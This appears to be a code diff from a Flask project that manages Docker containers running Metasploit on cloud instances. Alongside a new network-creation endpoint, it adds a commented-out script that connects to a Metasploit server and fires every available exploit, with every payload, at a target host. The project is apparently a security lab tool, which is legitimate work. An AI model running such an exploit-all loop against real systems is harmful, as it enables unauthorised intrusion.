@@ -7,7 +7,8 @@ from .api_endpoints import (
     SecurityGroupsApi,
     InstancesApi,
     ContainersApi,
-    DockerImagesApi
+    DockerImagesApi,
+    DockerNetworksApi
 )
 
 # import metasploit.aws.aws_access as aws_acc
@@ -18,9 +19,28 @@ from .api_endpoints import (
 
 from metasploit.api.database import DatabaseCollections
 
+
 # from metasploit.connections import Metasploit
 #
-# m = Metasploit(server='ec2-13-59-38-180.us-east-2.compute.amazonaws.com', port=50000)
+# m = Metasploit(server='18.219.135.199', port=50000)
+# target_host = '172.18.0.3'
+# result = []
+# exploit_number = 0
+# num_payloads = 0
+# for e in m.exploits:
+#     try:
+#         exploit_number += 1
+#         print(exploit_number)
+#         exploit = m.metasploit_client.modules.use('exploit', mname=e)
+#         num_payloads += len(exploit.targetpayloads())
+#         if 'RHOSTS' in exploit.options:
+#             exploit['RHOSTS'] = target_host
+#             for p in exploit.targetpayloads():
+#                 print(p)
+#                 result.append(exploit.execute(payload=p))
+#     except Exception as e:
+#         print(e)
+#
 # print(m.exploits)
 
 """
@@ -234,6 +254,12 @@ flask_wrapper.add_endpoints(
         '/DockerServerInstances/<instance_id>/Containers/CreateMetasploitContainer',
         'ContainersApi.run_container_with_metasploit_daemon_endpoint',
         ContainersApi.run_container_with_metasploit_daemon_endpoint,
+        [HttpMethods.POST]
+    ),
+    (
+        '/DockerServerInstances/<instance_id>/Networks/Create',
+        'DockerNetworksApi.create_network_endpoint',
+        DockerNetworksApi.create_network_endpoint,
         [HttpMethods.POST]
     )
 )
